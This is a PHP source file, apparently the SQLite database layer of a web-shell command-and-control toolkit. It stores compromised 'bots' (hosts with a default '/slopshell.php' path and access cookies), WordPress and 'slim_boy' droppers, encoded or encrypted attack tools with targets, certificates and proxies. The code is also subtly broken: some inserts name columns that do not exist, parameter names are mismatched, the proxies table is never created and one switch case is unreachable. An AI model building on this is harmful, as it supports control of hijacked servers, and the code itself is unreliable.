<?php

namespace database;

use PDOException;
use SQLite3;
use Symfony\Component\Console\Output\ConsoleOutput;
use Symfony\Component\Console\Helper\Table;

class slopSqlite extends \SQLite3
{
    private array $bot_data;
    private $currentRows;

    public function __construct(string $filename, int $flags = SQLITE3_OPEN_READWRITE | SQLITE3_OPEN_CREATE)
    {
        parent::__construct($filename, $flags);
        $this->bot_data = [];
    }

    public static function escapeString(string $string): string
    {
        return parent::escapeString($string); // TODO: Change the autogenerated stub
    }

    public function busyTimeout(int $milliseconds): bool
    {
        return parent::busyTimeout($milliseconds); // TODO: Change the autogenerated stub
    }

    public function close(): void
    {
        parent::close(); // TODO: Change the autogenerated stub
    }

    public function firstRun(): array
    {
        $success_list = [];
        $prepare_tables = [
            "main" => "CREATE TABLE IF NOT EXISTS sloppy_bots_main(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, datetime TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL, proto TEXT NOT NULL DEFAULT 'https', rhost TEXT UNIQUE NOT NULL, uri TEXT NOT NULL DEFAULT '/slopshell.php', uuid TEXT UNIQUE NOT NULL, os_flavor TEXT NOT NULL, check_in INTEGER DEFAULT 0 NOT NULL, agent TEXT NOT NULL DEFAULT 'sp/1.1', cname TEXT NOT NULL DEFAULT '-', cvalue TEXT NOT NULL DEFAULT '-');",
            "droppers" => "CREATE TABLE IF NOT EXISTS sloppy_bots_droppers(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,date_added TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,location_on_disk TEXT UNIQUE NOT NULL, post_var TEXT NOT NULL DEFAULT '-', cookiename TEXT NOT NULL DEFAULT '-', user_agent TEXT NOT NULL DEFAULT 'sp/1.1', dropper_type TEXT NOT NULL DEFAULT '-', uuid TEXT UNIQUE NOT NULL, activator TEXT NOT NULL DEFAULT '-', cookie_val TEXT UNIQUE NOT NULL DEFAULT '-');",
            "tools" => "CREATE TABLE IF NOT EXISTS sloppy_bots_tools(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,date_added TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,tool_name TEXT UNIQUE NOT NULL,target TEXT NOT NULL,base64_encoded_tool TEXT UNIQUE NOT NULL,keys TEXT UNIQUE,tags TEXT UNIQUE,iv TEXT UNIQUE,cipher TEXT NOT NULL DEFAULT 'NONE',hmac_hash TEXT UNIQUE,lang TEXT NOT NULL,is_encrypted BOOLEAN DEFAULT false);",
            "certs" => "CREATE TABLE IF NOT EXISTS sloppy_bots_certs(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,date_added TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,cert_location_on_disk TEXT UNIQUE NOT NULL,base64_encoded_cert TEXT UNIQUE NOT NULL,csr TEXT UNIQUE,pub TEXT UNIQUE,pem TEXT UNIQUE,cipher TEXT DEFAULT '-',is_encrypted BOOLEAN DEFAULT FALSE,priv_key_pass TEXT UNIQUE NOT NULL,rotated BOOLEAN NOT NULL DEFAULT FALSE);",
        ];
        foreach ($prepare_tables as $table => $createCall) {
            if ($this->exec($createCall) === true) {
                $success_list[$table] = "Successful!\n";
            } else {
                $success_list[$table] = "Not successful.\n";
            }
        }
        return $success_list;
    }

    private function insertPress($data): bool
    {
        $stmt = $this->prepare("INSERT INTO sloppy_bots_droppers(location_on_disk, cookiename, cookie_val, user_agent, uuid, dropper_type) VALUES (:location_on_disk,:cookiename,:cookie_val,:user_agent,:uuid,:dropper_type)");
        $stmt->bindValue(":location_on_disk", $data['zip']);
        $stmt->bindValue(":cookiename", $data['CookieName']);
        $stmt->bindValue(":cookie_val", $data['CookieVal']);
        $stmt->bindValue(":user_agent", $data['AllowedAgent']);
        $stmt->bindValue(":uuid", $data['UUID']);
        $stmt->bindValue(":dropper_type", "wordpress");
        return $stmt->execute() !== false;
    }

    private function insertBot($data): bool
    {
        $stmt = $this->prepare("INSERT INTO sloppy_bots_main(rhost, uri, uuidd, os_flavor, check_in, cname, cval) 
                                VALUES (:rhost, :uri, :uuid, :os_flavor, :check_in, :cname, :cval);");
        $stmt->bindValue(":rhost", $data['rhost']);
        $stmt->bindValue(":uri", $data['uri']);
        $stmt->bindValue(":uuid", $data['uuid']);
        $stmt->bindValue(":os_flavor", $data['os_flavor']);
        $stmt->bindValue(":check_in", $data['check_in'] ?? 1);
        $stmt->bindValue(":cname", $data['cname']);
        $stmt->bindValue(":cval", $data['cval']);
        return $stmt->execute() !== false;
    }

    private function insertDropper(array $data): bool
    {
        $stmt = $this->prepare("INSERT INTO sloppy_bots_droppers(location_on_disk, cookiename, user_agent, dropper_type, post_var, activator) VALUES(:location_on_disk,:cookiename,:user_agent,:dropper_type,:post_var,:activator);");
        $stmt->bindValue(":location_on_disk", $data['dropper']);
        $stmt->bindValue(":cookiename", $data['cookie_name']);
        $stmt->bindValue(":user_agent", $data['user_agent']);
        $stmt->bindValue(":dropper_type", 'slim_boy');
        $stmt->bindValue(":post_var", $data['post_variable']);
        $stmt->bindValue(":activator", $data['activator']);
        return $stmt->execute() !== false;
    }

    private function insertCertificate(array $data): bool
    {
        $stmt = $this->prepare("INSERT INTO sloppy_bots_certs(cert_location_on_disk, base64_encoded_cert, csr, pub, pem, cipher, is_encrypted, priv_key_pass) VALUES (:cert_location_on_disk, :base64_encoded_cert, :csr, :pub, :pem, :cipher, :is_encrypted, :priv_key_pass)");
        $stmt->bindValue(":cert_location_on_disk", $data['cert_location'], SQLITE3_TEXT);
        $stmt->bindValue(":base64_encoded_cert", $data['base64_data'], SQLITE3_TEXT);
        $stmt->bindValue(":csr", $data['csr'], SQLITE3_TEXT);
        $stmt->bindValue(":pub", $data['pub'], SQLITE3_TEXT);
        $stmt->bindValue(":pem", $data['pem'], SQLITE3_TEXT);
        $stmt->bindValue(":cipher", $data['cipher'], SQLITE3_TEXT);
        $stmt->bindValue(":is_encrypted", $data['is_encrypted'], SQLITE3_TEXT);
        $stmt->bindValue(":priv_key_pass", $data['priv_key_pass'], SQLITE3_TEXT);
        return $stmt->execute() !== false;
    }

    private function insertProxy(array $data): bool
    {
        $stmt = $this->prepare("INSERT INTO sloppy_bots_proxies(proxy_schema, proxy) VALUES(:schema, :proxy);");
        $stmt->bindValue(":schema", $data['proxy_schema']);
        $stmt->bindValue(":proxy", $data['proxy']);
        return $stmt->execute() !== false;
    }

    private function insertEncryptedTool(array $data): bool
    {
        $stmt = $this->prepare("INSERT INTO sloppy_bots_tools(tool_name, target, base64_encoded_tool, keys, tags, iv, cipher, hmac_hash, lang, is_encrypted) VALUES(:tool_name, :target, :b64_encrypted, :keys, :tags, :iv, :cipher, :hmac_hash, :lang, :is_encrypted);");
        $stmt->bindValue(':tool_name', $data['tool_name']);
        $stmt->bindValue(':target', $data['target']);
        $stmt->bindValue(':b64_encrypted', $data['base64_data']);
        $stmt->bindValue(':key', $data['key']);
        $stmt->bindValue(':tags', $data['tag']);
        $stmt->bindValue(':iv', $data['iv']);
        $stmt->bindValue(':cipher', $data['cipher']);
        $stmt->bindValue(':hmac_hash', $data['hmac_hash']);
        $stmt->bindValue(':lang', $data['lang']);
        $stmt->bindValue(':is_encrypted', $data['is_encrypted']);
        return $stmt->execute() !== false;
    }

    private function insertTool(array $data): bool
    {
        $stmt = $this->prepare("INSERT INTO sloppy_bots_tools(tool_name, target, base64_encoded_tool, lang, is_encrypted) VALUES(:tool_name, :target, :base64_encoded_tool, :lang, :is_encrypted);");
        $stmt->bindValue(':base64_encoded_tool', $data['base64_data']);
        $stmt->bindValue(':tool_name', $data['tool_name']);
        $stmt->bindValue(':lang', $data['lang']);
        $stmt->bindValue(':target', $data['target']);
        $stmt->bindValue(':is_encrypted', $data['is_encrypted']);
        return $stmt->execute();
    }

    public function grabAndFormatOutput(int $lastId = 0, int $itemsPerPage = 20, string $type)
    {
        switch (true) {
            case str_contains($type, "bot") !== false:
                $query = sprintf(
                    'SELECT id, proto, rhost, uri, uuid, os_flavor, agent, cname, cvalue 
            FROM sloppy_bots_main 
            WHERE id > %s
            ORDER BY id ASC
            LIMIT %s',
                    $lastId,
                    $itemsPerPage
                );
                $res = $this->query($query);
                if (!is_bool($res)) {
                    $rows = [];
                    while ($row = $res->fetchArray(SQLITE3_ASSOC)) $rows[] = $row;
                    if (count($rows) === 0) {
                        return $lastId;
                    }
                    $lastId = end($rows)['id'];
                    $output = new ConsoleOutput();
                    $table = new Table($output);
                    $table->setHeaders(array_keys($rows[0]));
                    $table->setRows($rows);
                    $table->render();
                    return $lastId;
                } else {
                    return $lastId;
                }
            case str_contains($type, "tool") !== false:
                return 0;
            case str_contains($type, "proxy") !== false:
                return 1;
        }
    }
    private function grabAllBots(){
        // gonna need to do stuff with this.
    }

    private function selectBot(string $id): array
    {
        $this->bot_data = [];
        $bot = $this->prepare('SELECT proto, rhost, uri, uuid, os_flavor, agent, cname, cvalue FROM sloppy_bots_main WHERE id = :bot_id');
        $bot->bindValue(':bot_id', $id);
        $r = $bot->execute();
        while ($res = $r->fetchArray(SQLITE3_ASSOC)) {
            $this->bot_data[] = $res;
        }
        return $this->bot_data;
    }

    private function updateBot(string $botId, string $newUri)
    {
        $updateCall = $this->prepare("UPDATE sloppy_bots_main SET uri = :newUri WHERE id = :botId");
        $updateCall->bindValue(":newUri", $newUri);
        $updateCall->bindValue(":botId", $botId);
        return $updateCall->execute();
    }

    public function slopSqlite(array $data): mixed
    {
        if (empty($data['action'])) {
            print("Action is empty, cannot handle this.");
            return false;
        }
        try {
            switch (true) {
                case str_contains($data['action'], "updateBot") !== false:
                    return $this->updateBot($data['botID'], $data['newUri']);
                case str_contains($data['action'], "grabBot"):
                    $this->selectBot($data['botID']);
                    return $this->bot_data;
                case str_contains($data['action'], "add_press"):
                    return $this->insertPress($data);
                case str_contains($data['action'], "add_bot"):
                    return $this->insertBot($data);
                case str_contains($data['action'], 'add_tool'):
                    return $this->insertTool($data);
                case str_contains($data['action'], "add_tool_encrypted"):
                    return $this->insertEncryptedTool($data);
                case str_contains($data['action'], 'add_cert'):
                    return $this->insertCertificate($data);
                case str_contains($data['action'], 'add_dropper'):
                    return $this->insertDropper($data);
                case str_contains($data['action'], 'proxies'):
                    return $this->insertProxy($data);
                default:
                    print("Action was invalid, cannot handle this.");
                    return false;
            }
        } catch (PDOException $e) {
            error_log($e->getMessage());
            return false;
        }
    }

    public function backup(SQLite3 $destination, string $sourceDatabase = 'main', string $destinationDatabase = 'main'): bool
    {
        return parent::backup($destination, $sourceDatabase, $destinationDatabase); // TODO: Change the autogenerated stub
    }

    public function enableExtendedResultCodes(bool $enable = true): bool
    {
        return parent::enableExtendedResultCodes($enable); // TODO: Change the autogenerated stub
    }

    public function lastExtendedErrorCode(): int
    {
        return parent::lastExtendedErrorCode(); // TODO: Change the autogenerated stub
    }

    public function lastErrorCode(): int
    {
        return parent::lastErrorCode(); // TODO: Change the autogenerated stub
    }
}